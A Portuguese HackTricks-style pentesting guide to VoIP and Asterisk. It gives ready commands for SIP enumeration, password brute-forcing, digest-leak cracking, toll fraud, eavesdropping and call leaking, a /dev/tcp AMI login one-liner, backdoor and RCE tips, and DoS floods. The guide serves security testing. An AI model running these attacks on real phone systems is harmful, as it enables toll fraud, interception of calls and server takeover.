# Pentesting VoIP

{{#include ../../banners/hacktricks-training.md}}


## Informações Básicas sobre VoIP

Para começar a aprender sobre como o VoIP funciona, consulte:

{{#ref}}
basic-voip-protocols/
{{#endref}}

## Mensagens Básicas
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Códigos de Resposta

**1xx—Respostas Provisórias**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Respostas Bem-Sucedidas**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Respostas de Redirecionamento**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—Respostas de Falha do Cliente**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Respostas de Falha do Servidor**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Respostas de Falha Global**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## Enumeração de VoIP

### Números de Telefone

Um dos primeiros passos que uma Red Team pode dar é procurar números de telefone disponíveis para contatar a empresa usando ferramentas de OSINT, buscas no Google ou raspagem de páginas da web.

Uma vez que você tenha os números de telefone, você pode usar serviços online para identificar o operador:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Saber se o operador fornece serviços de VoIP pode ajudá-lo a identificar se a empresa está usando VoIP... Além disso, é possível que a empresa não tenha contratado serviços de VoIP, mas esteja usando cartões PSTN para conectar seu próprio PBX VoIP à rede de telefonia tradicional.

Coisas como respostas automáticas de música geralmente indicam que o VoIP está sendo usado.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informações OSINT

Qualquer outra enumeração OSINT que ajude a identificar o software VoIP em uso será útil para uma Red Team.

### Enumeração de Rede

- **`nmap`** é capaz de escanear serviços UDP, mas devido ao número de serviços UDP sendo escaneados, é muito lento e pode não ser muito preciso com esse tipo de serviços.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
- **`svmap`** do SIPVicious (`sudo apt install sipvicious`): Localizará serviços SIP na rede indicada.
- `svmap` é **fácil de bloquear** porque usa o User-Agent `friendly-scanner`, mas você pode modificar o código de `/usr/share/sipvicious/sipvicious` e alterá-lo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
- **`SIPPTS scan`** de [**sippts**](https://github.com/Pepelux/sippts)**:** O SIPPTS scan é um scanner muito rápido para serviços SIP sobre UDP, TCP ou TLS. Ele utiliza multithread e pode escanear grandes faixas de redes. Permite indicar facilmente um intervalo de portas, escanear tanto TCP quanto UDP, usar outro método (por padrão, usará OPTIONS) e especificar um User-Agent diferente (e mais).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
- **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumeração Extra de Rede

O PBX também pode estar expondo outros serviços de rede, como:

- **69/UDP (TFTP)**: Atualizações de firmware
- **80 (HTTP) / 443 (HTTPS)**: Para gerenciar o dispositivo pela web
- **389 (LDAP)**: Alternativa para armazenar as informações dos usuários
- **3306 (MySQL)**: Banco de dados MySQL
- **5038 (Manager)**: Permite usar Asterisk de outras plataformas
- **5222 (XMPP)**: Mensagens usando Jabber
- **5432 (PostgreSQL)**: Banco de dados PostgreSQL
- E outros...

### Enumeração de Métodos

É possível encontrar **quais métodos estão disponíveis** para usar no PBX usando `SIPPTS enumerate` do [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analisando as respostas do servidor

É muito importante analisar os cabeçalhos que um servidor nos envia, dependendo do tipo de mensagem e cabeçalhos que enviamos. Com `SIPPTS send` do [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensagens personalizadas, manipulando todos os cabeçalhos, e analisar a resposta.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Também é possível obter dados se o servidor usar websockets. Com `SIPPTS wssend` do [**sippts**](https://github.com/Pepelux/sippts) podemos enviar mensagens WS personalizadas.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumeração de Extensões

Extensões em um sistema PBX (Private Branch Exchange) referem-se aos **identificadores internos únicos atribuídos a linhas** telefônicas, dispositivos ou usuários individuais dentro de uma organização ou empresa. As extensões possibilitam **rutar chamadas dentro da organização de forma eficiente**, sem a necessidade de números de telefone externos individuais para cada usuário ou dispositivo.

- **`svwar`** do SIPVicious (`sudo apt install sipvicious`): `svwar` é um scanner de linha de extensão SIP PBX gratuito. Em conceito, funciona de forma semelhante aos discadores tradicionais, **adivinhando uma faixa de extensões ou uma lista específica de extensões**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
- **`SIPPTS exten`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifica extensões em um servidor SIP. Sipexten pode verificar grandes redes e intervalos de portas.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
- **metasploit**: Você também pode enumerar extensões/nomes de usuário com metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
- **`enumiax` (`apt install enumiax`): enumIAX** é um enumerador de **brute-force de nome de usuário** do protocolo Inter Asterisk Exchange. O enumIAX pode operar em dois modos distintos: Adivinhação Sequencial de Nome de Usuário ou Ataque de Dicionário.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataques VoIP

### Força Bruta de Senha - online

Tendo descoberto o **PBX** e alguns **números de ramal/nome de usuário**, uma equipe vermelha poderia tentar **autenticar via o método `REGISTER`** em um ramal usando um dicionário de senhas comuns para realizar a força bruta na autenticação.

> [!CAUTION]
> Note que um **nome de usuário** pode ser o mesmo que o ramal, mas essa prática pode variar dependendo do sistema PBX, sua configuração e as preferências da organização...
>
> Se o nome de usuário não for o mesmo que o ramal, você precisará **descobrir o nome de usuário para realizar a força bruta**.

- **`svcrack`** do SIPVicious (`sudo apt install sipvicious`): SVCrack permite que você quebre a senha para um nome de usuário/ramal específico em um PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
- **`SIPPTS rcrack`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack é um cracker de senha remoto para serviços SIP. Rcrack pode testar senhas para vários usuários em diferentes IPs e faixas de portas.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
- **Metasploit**:
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### Sniffing VoIP

Se você encontrar equipamentos VoIP dentro de uma **rede Wifi aberta**, você pode **capturar todas as informações**. Além disso, se você estiver dentro de uma rede mais fechada (conectada via Ethernet ou Wifi protegido), você pode realizar **ataques MitM como** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre o **PBX e o gateway** para capturar as informações.

Entre as informações da rede, você pode encontrar **credenciais da web** para gerenciar o equipamento, **ramais** de usuário, **nome de usuário**, endereços **IP**, até mesmo **senhas hash** e **pacotes RTP** que você pode reproduzir para **ouvir a conversa**, e mais.

Para obter essas informações, você pode usar ferramentas como Wireshark, tcpdump... mas uma **ferramenta especialmente criada para capturar conversas VoIP é** [**ucsniff**](https://github.com/Seabreg/ucsniff).

> [!CAUTION]
> Note que se **TLS for usado na comunicação SIP** você não poderá ver a comunicação SIP em claro.\
> O mesmo acontecerá se **SRTP** e **ZRTP** forem usados, **os pacotes RTP não estarão em texto claro**.

#### Credenciais SIP (Brute-Force de Senha - offline)

[Verifique este exemplo para entender melhor uma **comunicação SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) para aprender como as **credenciais estão sendo enviadas**.

- **`sipdump`** & **`sipcrack`,** parte do **sipcrack** (`apt-get install sipcrack`): Essas ferramentas podem **extrair** de um **pcap** as **autenticações digest** dentro do protocolo SIP e **bruteforçá-las**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
- **`SIPPTS dump`** do [**sippts**](https://github.com/Pepelux/sippts)**:** O SIPPTS dump pode extrair autenticações digest de um arquivo pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
- **`SIPPTS dcrack`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack é uma ferramenta para quebrar as autenticações digest obtidas com o dump do SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
- **`SIPPTS tshark`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark extrai dados do protocolo SIP de um arquivo PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Códigos DTMF

**Não apenas credenciais SIP** podem ser encontradas no tráfego da rede, também é possível encontrar códigos DTMF que são usados, por exemplo, para acessar a **caixa de correio de voz**.\
É possível enviar esses códigos em **mensagens SIP INFO**, em **áudio** ou dentro de **pacotes RTP**. Se os códigos estiverem dentro de pacotes RTP, você pode cortar essa parte da conversa e usar a ferramenta multimo para extraí-los:
```bash
multimon -a DTMF -t wac pin.wav
```
### Chamadas Gratuitas / Configurações Incorretas de Conexões Asterisks

No Asterisk, é possível permitir uma conexão **de um endereço IP específico** ou de **qualquer endereço IP**:
```
host=10.10.10.10
host=dynamic
```
Se um endereço IP for especificado, o host **não precisará enviar solicitações REGISTER** de vez em quando (no pacote REGISTER é enviado o tempo de vida, geralmente 30min, o que significa que em outro cenário o telefone precisará se REGISTRAR a cada 30min). No entanto, ele precisará ter portas abertas permitindo conexões do servidor VoIP para receber chamadas.

Para definir usuários, eles podem ser definidos como:

- **`type=user`**: O usuário pode apenas receber chamadas como usuário.
- **`type=friend`**: É possível realizar chamadas como par e recebê-las como usuário (usado com extensões)
- **`type=peer`**: É possível enviar e receber chamadas como par (SIP-trunks)

Também é possível estabelecer confiança com a variável insegura:

- **`insecure=port`**: Permite conexões de pares validadas por IP.
- **`insecure=invite`**: Não requer autenticação para mensagens INVITE
- **`insecure=port,invite`**: Ambos

> [!WARNING]
> Quando **`type=friend`** é usado, o **valor** da variável **host** **não será usado**, então se um administrador **configurar incorretamente um SIP-trunk** usando esse valor, **qualquer um poderá se conectar a ele**.
>
> Por exemplo, esta configuração seria vulnerável:\
> `host=10.10.10.10`\
> `insecure=port,invite`\
> `type=friend`

### Chamadas Gratuitas / Configurações Incorretas de Contexto do Asterisk

No Asterisk, um **contexto** é um contêiner ou seção nomeada no plano de discagem que **agrupa extensões, ações e regras relacionadas**. O plano de discagem é o componente central de um sistema Asterisk, pois define **como as chamadas recebidas e enviadas são tratadas e roteadas**. Os contextos são usados para organizar o plano de discagem, gerenciar controle de acesso e fornecer separação entre diferentes partes do sistema.

Cada contexto é definido no arquivo de configuração, tipicamente no arquivo **`extensions.conf`**. Os contextos são denotados por colchetes, com o nome do contexto encerrado dentro deles. Por exemplo:
```bash
csharpCopy code[my_context]
```
Dentro do contexto, você define extensões (padrões de números discados) e as associa a uma série de ações ou aplicativos. Essas ações determinam como a chamada é processada. Por exemplo:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Este exemplo demonstra um contexto simples chamado "my_context" com uma extensão "100". Quando alguém disca 100, a chamada será atendida, uma mensagem de boas-vindas será reproduzida e, em seguida, a chamada será encerrada.

Este é **outro contexto** que permite **ligar para qualquer outro número**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Se o administrador definir o **contexto padrão** como:
```
[default]
include => my_context
include => external
```
> [!WARNING]
> Qualquer pessoa poderá usar o **servidor para ligar para qualquer outro número** (e o administrador do servidor pagará pela chamada).

> [!CAUTION]
> Além disso, por padrão, o arquivo **`sip.conf`** contém **`allowguest=true`**, então **qualquer** atacante sem **autenticação** poderá ligar para qualquer outro número.

- **`SIPPTS invite`** do [**sippts**](https://github.com/Pepelux/sippts)**:** O convite SIPPTS verifica se um **servidor PBX nos permite fazer chamadas sem autenticação**. Se o servidor SIP tiver uma configuração incorreta, ele nos permitirá fazer chamadas para números externos. Também pode nos permitir transferir a chamada para um segundo número externo.

Por exemplo, se o seu servidor Asterisk tiver uma configuração de contexto ruim, você pode aceitar solicitações INVITE sem autorização. Nesse caso, um atacante pode fazer chamadas sem conhecer qualquer usuário/senha.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
### Chamadas gratuitas / IVRS mal configurados

IVRS significa **Sistema de Resposta de Voz Interativa**, uma tecnologia de telefonia que permite aos usuários interagir com um sistema computadorizado por meio de entradas de voz ou toque. O IVRS é usado para construir sistemas de **manipulação automatizada de chamadas** que oferecem uma variedade de funcionalidades, como fornecer informações, direcionar chamadas e capturar entradas do usuário.

O IVRS em sistemas VoIP geralmente consiste em:

1. **Mensagens de voz**: Mensagens de áudio pré-gravadas que orientam os usuários através das opções e instruções do menu IVR.
2. **DTMF** (Dual-Tone Multi-Frequency) sinalização: Entradas de toque geradas ao pressionar teclas no telefone, que são usadas para navegar pelos menus IVR e fornecer entradas.
3. **Roteamento de chamadas**: Direcionar chamadas para o destino apropriado, como departamentos específicos, agentes ou ramais com base na entrada do usuário.
4. **Captura de entrada do usuário**: Coletar informações dos chamadores, como números de conta, IDs de caso ou quaisquer outros dados relevantes.
5. **Integração com sistemas externos**: Conectar o sistema IVR a bancos de dados ou outros sistemas de software para acessar ou atualizar informações, realizar ações ou acionar eventos.

Em um sistema VoIP Asterisk, você pode criar um IVR usando o plano de discagem (**`extensions.conf`** arquivo) e várias aplicações como `Background()`, `Playback()`, `Read()`, e mais. Essas aplicações ajudam você a reproduzir mensagens de voz, capturar entradas do usuário e controlar o fluxo da chamada.

#### Exemplo de configuração vulnerável
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
O anterior é um exemplo onde o usuário é solicitado a **pressionar 1 para chamar** um departamento, **2 para chamar** outro, ou **o número completo** se souber.\
A vulnerabilidade é o fato de que o **comprimento da extensão indicada não é verificado, então um usuário poderia inserir o tempo limite de 5 segundos de um número completo e ele será chamado.**

### Injeção de Extensão

Usando uma extensão como:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Onde **`${EXTEN}`** é a **extensão** que será chamada, quando a **ext 101 for introduzida** isso é o que aconteceria:
```scss
exten => 101,1,Dial(SIP/101)
```
No entanto, se **`${EXTEN}`** permitir a introdução de **mais do que números** (como em versões mais antigas do Asterisk), um atacante poderia introduzir **`101&SIP123123123`** para chamar o número de telefone 123123123. E este seria o resultado:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Portanto, uma chamada para a extensão **`101`** e **`123123123`** será enviada e apenas a primeira que receber a chamada será estabelecida... mas se um atacante usar uma **extensão que contorne qualquer correspondência** que está sendo realizada, mas não existe, ele poderia **injetar uma chamada apenas para o número desejado**.

## Vulnerabilidade SIPDigestLeak

A vulnerabilidade SIP Digest Leak afeta um grande número de telefones SIP, incluindo tanto telefones IP de hardware quanto de software, bem como adaptadores de telefone (VoIP para analógico). A vulnerabilidade permite **vazamento da resposta de autenticação Digest**, que é calculada a partir da senha. Um **ataque de senha offline é então possível** e pode recuperar a maioria das senhas com base na resposta ao desafio.

**[Cenário de vulnerabilidade a partir daqui**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Um telefone IP (vítima) está ouvindo em qualquer porta (por exemplo: 5060), aceitando chamadas telefônicas
2. O atacante envia um INVITE para o telefone IP
3. O telefone da vítima começa a tocar e alguém atende e desliga (porque ninguém atende o telefone do outro lado)
4. Quando o telefone é desligado, o **telefone da vítima envia um BYE para o atacante**
5. O **atacante emite uma resposta 407** que **pede autenticação** e emite um desafio de autenticação
6. O **telefone da vítima fornece uma resposta ao desafio de autenticação** em um segundo BYE
7. O **atacante pode então realizar um ataque de força bruta** na resposta ao desafio em sua máquina local (ou rede distribuída etc) e adivinhar a senha

- **SIPPTS leak** de [**sippts**](https://github.com/Pepelux/sippts)**:** O vazamento SIPPTS explora a vulnerabilidade SIP Digest Leak que afeta um grande número de telefones SIP. A saída pode ser salva no formato SipCrack para ser forçada usando SIPPTS dcrack ou a ferramenta SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permite que um **usuário da web** (que, por exemplo, pode estar interessado em um produto) **introduza** seu **número de telefone** para ser chamado. Em seguida, um comercial será chamado, e quando ele **atender o telefone**, o usuário será **chamado e conectado com o agente**.

Um perfil comum do Asterisk para isso é:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
- O perfil anterior está permitindo **QUALQUER endereço IP se conectar** (se a senha for conhecida).
- Para **organizar uma chamada**, como especificado anteriormente, **nenhuma permissão de leitura é necessária** e **apenas** **origem** em **escrita** é necessária.

Com essas permissões, qualquer IP que conheça a senha poderia se conectar e extrair informações demais, como:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
**Mais informações ou ações podem ser solicitadas.**

### **Escuta**

No Asterisk, é possível usar o comando **`ChanSpy`** indicando a(s) **extensão(ões) a serem monitoradas** (ou todas elas) para ouvir as conversas que estão acontecendo. Este comando precisa ser atribuído a uma extensão.

Por exemplo, **`exten => 333,1,ChanSpy('all',qb)`** indica que se você **ligar** para a **extensão 333**, ela irá **monitorar** **`todas`** as extensões, **começar a ouvir** sempre que uma nova conversa começar (**`b`**) em modo silencioso (**`q`**) pois não queremos interagir. Você pode alternar de uma conversa para outra pressionando **`*`**, ou discando o número da extensão.

Também é possível usar **`ExtenSpy`** para monitorar apenas uma extensão.

Em vez de ouvir as conversas, é possível **gravá-las em arquivos** usando uma extensão como:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
As chamadas serão salvas em **`/tmp`**.

Você também pode fazer com que o Asterisk **execute um script que irá vazar a chamada** quando for encerrada.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vulnerabilidade RTCPBleed

**RTCPBleed** é um problema de segurança significativo que afeta servidores VoIP baseados em Asterisk (publicado em 2017). A vulnerabilidade permite que o **tráfego RTP (Real Time Protocol)**, que transporta conversas VoIP, seja **interceptado e redirecionado por qualquer pessoa na Internet**. Isso ocorre porque o tráfego RTP contorna a autenticação ao navegar através de firewalls NAT (Network Address Translation).

Proxies RTP tentam abordar as **limitações do NAT** que afetam sistemas RTC, fazendo proxy de fluxos RTP entre duas ou mais partes. Quando o NAT está em vigor, o software do proxy RTP muitas vezes não pode confiar nas informações de IP e porta RTP recuperadas através da sinalização (por exemplo, SIP). Portanto, vários proxies RTP implementaram um mecanismo onde tal **tupla de IP e porta é aprendida automaticamente**. Isso é frequentemente feito inspecionando o tráfego RTP de entrada e marcando o IP e a porta de origem para qualquer tráfego RTP de entrada como aquele que deve ser respondido. Esse mecanismo, que pode ser chamado de "modo de aprendizado", **não faz uso de qualquer tipo de autenticação**. Portanto, **atacantes** podem **enviar tráfego RTP para o proxy RTP** e receber o tráfego RTP proxy que deveria ser destinado ao chamador ou atendente de um fluxo RTP em andamento. Chamamos essa vulnerabilidade de RTP Bleed porque permite que atacantes recebam fluxos de mídia RTP destinados a serem enviados a usuários legítimos.

Outro comportamento interessante dos proxies RTP e das pilhas RTP é que, às vezes, **mesmo que não sejam vulneráveis ao RTP Bleed**, eles **aceitarão, encaminharão e/ou processarão pacotes RTP de qualquer fonte**. Portanto, atacantes podem enviar pacotes RTP que podem permitir que eles injetem sua mídia em vez da legítima. Chamamos esse ataque de injeção RTP porque permite a injeção de pacotes RTP ilegítimos em fluxos RTP existentes. Essa vulnerabilidade pode ser encontrada tanto em proxies RTP quanto em endpoints.

Asterisk e FreePBX tradicionalmente usaram a **configuração `NAT=yes`**, que permite que o tráfego RTP contorne a autenticação, potencialmente levando a nenhuma áudio ou áudio unidirecional em chamadas.

Para mais informações, consulte [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

- **`SIPPTS rtpbleed`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed detecta a vulnerabilidade RTP Bleed enviando fluxos RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
- **`SIPPTS rtcpbleed`** do [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed detecta a vulnerabilidade RTP Bleed enviando streams RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
- **`SIPPTS rtpbleedflood`** do [**sippts**](https://github.com/Pepelux/sippts)**:** O SIPPTS rtpbleedflood explora a vulnerabilidade RTP Bleed enviando streams RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
- **`SIPPTS rtpbleedinject`** do [**sippts**](https://github.com/Pepelux/sippts)**:** O SIPPTS rtpbleedinject explora a vulnerabilidade RTP Bleed injetando um arquivo de áudio (formato WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

No Asterisk, se você conseguir **adicionar regras de extensão e recarregá-las** (por exemplo, comprometendo um servidor de gerenciador web vulnerável), é possível obter RCE usando o **`System`** command.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
Há um comando chamado **`Shell`** que pode ser usado **em vez de `System`** para executar comandos do sistema, se necessário.

> [!WARNING]
> Se o servidor **não permitir o uso de certos caracteres** no comando **`System`** (como no Elastix), verifique se o servidor web permite **criar arquivos de alguma forma dentro do sistema** (como no Elastix ou trixbox) e use isso para **criar um script de backdoor** e, em seguida, use **`System`** para **executar** esse **script**.

#### Arquivos locais interessantes e permissões

- **`sip.conf`** -> Contém a senha dos usuários SIP.
- Se o **servidor Asterisk estiver rodando como root**, você pode comprometer o root.
- O **usuário root do mysql** pode **não ter nenhuma senha**.
- isso pode ser usado para criar um novo usuário mysql como backdoor.
- **`FreePBX`**
- **`amportal.conf`** -> Contém a senha do administrador do painel web (FreePBX).
- **`FreePBX.conf`** -> Contém a senha do usuário FreePBXuser usado para acessar o banco de dados.
- isso pode ser usado para criar um novo usuário mysql como backdoor.
- **`Elastix`**
- **`Elastix.conf`** -> Contém várias senhas em texto claro, como a senha root do mysql, senha do IMAPd, senha do administrador web.
- **Várias pastas** pertencerão ao usuário asterisk comprometido (se não estiver rodando como root). Este usuário pode ler os arquivos anteriores e também controla a configuração, então ele pode fazer o Asterisk carregar outros binários com backdoor quando executados.

### Injeção RTP

É possível inserir um **`.wav`** nas conversas usando ferramentas como **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) e **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ou você pode usar os scripts de [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) para **escanear conversas** (**`rtpscan.pl`**), enviar um `.wav` para uma conversa (**`rtpsend.pl`**) e **inserir ruído** em uma conversa (**`rtpflood.pl`**).

### DoS

Existem várias maneiras de tentar alcançar DoS em servidores VoIP.

- **`SIPPTS flood`** de [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS flood envia mensagens ilimitadas para o alvo.
- `sippts flood -i 10.10.0.10 -m invite -v`
- **`SIPPTS ping`** de [**sippts**](https://github.com/Pepelux/sippts)\*\*: SIPPTS ping faz um ping SIP para ver o tempo de resposta do servidor.
- `sippts ping -i 10.10.0.10`
- [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS protocolo IAX usado pelo Asterisk.
- [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Uma ferramenta para realizar flooding de mensagens SIP/SDP INVITE sobre UDP/IP.
- [**rtpflood**](https://www.kali.org/tools/rtpflood/): Envia vários pacotes RTP bem formados. É necessário saber as portas RTP que estão sendo usadas (sniff primeiro).
- [**SIPp**](https://github.com/SIPp/sipp): Permite analisar e gerar tráfego SIP, então também pode ser usado para DoS.
- [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): Canivete suíço SIP. Também pode ser usado para realizar ataques SIP.
- Fuzzers: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).

### Vulnerabilidades do SO

